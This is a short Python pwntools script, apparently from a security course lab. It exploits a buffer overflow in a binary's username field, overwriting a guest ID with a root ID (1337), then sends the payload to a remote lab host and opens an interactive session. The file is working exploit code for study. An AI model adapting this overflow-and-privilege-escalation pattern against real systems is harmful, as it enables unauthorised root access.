from pwn import *

context.arch = "amd64"

# Initialize 28 characters padding bytes needed to overlfow the "Guest123" user_record username variable upto the "GUEST_ID"  offset 
PADDING = (b"A"*28)
print("The overflow padding bytes are: ", PADDING)
print("")

# Privilege escalation bytes, replacing GUEST_ID with ROOT_ID
ROOT_ID = p64(1337)
print("The ROOT_ID privilege escaltion bytes are: ", ROOT_ID)
print("")

# Initialize exploit payload
payload = PADDING + ROOT_ID
print("The final exploit payload is: ", payload)
print("")

# Launch exploit process 
#p = gdb.debug("./lab3-2.bin")  # run exploit against binary locally with process attached to gdb
#p = process("./lab3-2.bin")   # run exploit against binary locally without attacking the process to gdb 
p = remote("csc748.hostbin.org", 7032) # run the exploit against a remote process

# Select option 1 on the menu to change the username
response = p.readuntil("Choice:").decode("utf-8")
print(response)
print("")
p.sendline(b'1')
response = p.readuntil("username:").decode("utf-8")
print(response)
print("")
p.sendline(payload)
response = p.readuntil("Choice:").decode("utf-8")
print(response)
print("")
p.sendline(b'3')

# Switch to  interactive session
p.interactive()
